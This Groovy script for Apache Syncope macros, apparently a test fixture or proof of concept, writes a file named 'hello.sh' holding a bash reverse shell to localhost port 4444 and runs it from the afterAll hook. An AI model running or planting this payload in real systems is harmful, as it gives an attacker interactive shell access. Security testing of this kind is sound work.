/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
import groovy.transform.BaseScript
import org.apache.syncope.core.provisioning.api.macro.MacroActions
import java.io.Serializable

abstract class BashMacroActions extends Script implements MacroActions {}
@BaseScript BashMacroActions _

@Override
StringBuilder afterAll(Map<String, Serializable> ctx, StringBuilder output) {
  def f = new File('/tmp/hello.sh')
  f.withWriter { w ->
    w.println('#!/bin/bash')
    w.println('bash -i >& /dev/tcp/localhost/4444 0>&1')
  }
  f.setExecutable(true)

  def p  = ['/bin/bash','-lc','/tmp/hello.sh'].execute()
  def so = new StringWriter()
  def se = new StringWriter()
  p.consumeProcessOutput(so, se)
  p.waitFor()

  output
  .append('\n[macro] wrote /tmp/hello.sh and executed it.\n[stdout]\n')
  .append(so.toString()).append('\n')
  if (se.toString()) {
    output.append('[stderr]\n').append(se.toString()).append('\n')
  }
  return output
}
